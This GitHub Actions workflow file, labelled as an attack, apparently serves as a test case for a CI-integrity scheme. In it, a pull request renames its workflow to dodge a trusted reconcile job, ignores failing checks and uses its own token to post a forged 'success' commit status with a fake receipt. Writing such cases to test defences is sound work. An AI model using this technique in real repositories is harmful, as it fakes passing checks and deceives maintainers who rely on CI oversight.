name: execute (patched by the pull request)

# ATTACK. A same-repo PR rewrites the untrusted workflow. Renaming it means the
# trusted `reconcile` workflow_run (filtered on the name "execute") never fires,
# and the PR grants its own GITHUB_TOKEN statuses:write to forge the verdict.

on:
  pull_request:

permissions:
  contents: read
  statuses: write

jobs:
  execute:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: the real checks fail
        run: sh ./run-checks.sh || echo "checks failed (exit $?) — ignored"
      - name: forge the reconcile verdict
        env:
          GH_TOKEN: ${{ github.token }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          gh api --method POST "repos/$GITHUB_REPOSITORY/statuses/$HEAD_SHA" \
            -f state=success -f context=reconcile \
            -f description="receipt sha256:forged-by-the-pull-request"
